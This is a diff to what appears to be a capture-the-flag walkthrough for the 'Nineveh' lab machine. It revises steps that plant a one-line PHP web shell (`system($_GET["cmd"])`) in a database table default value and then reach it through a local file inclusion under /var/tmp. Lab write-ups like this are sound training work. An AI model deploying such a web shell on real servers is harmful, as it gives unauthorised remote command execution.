@@ -385,7 +385,7 @@ In this case, we will create one named `exploit.php`:
 
 <br />
 
-2.- Create a new table in our database with our malicious php code:.
+### 2.- Create a new table in our database with our malicious php code:.
 
 <br />
 
@@ -402,9 +402,24 @@ Now we select the `"Type"` text, and enter the php code into the `"Default Value
 <br />
 
 ```php
-<?php system($_GET['cmd']); ?>
+<?php system($_GET["cmd"]); ?>
 ```
 ![11](../../../assets/images/Nineveh/11.png)
 
+<br />
+
+⚠️ Note: Important to use double quotes `"` instead single quotes `'`.
 
 <br />
+
+### 3.- Run the cmd.php:
+
+<br />
+
+At this point, we have our all ready to run our `cmd.php`, but we need a `LFI` to access it, since its path is under `/var/tmp`:
+
+<br />
+
+
+
+
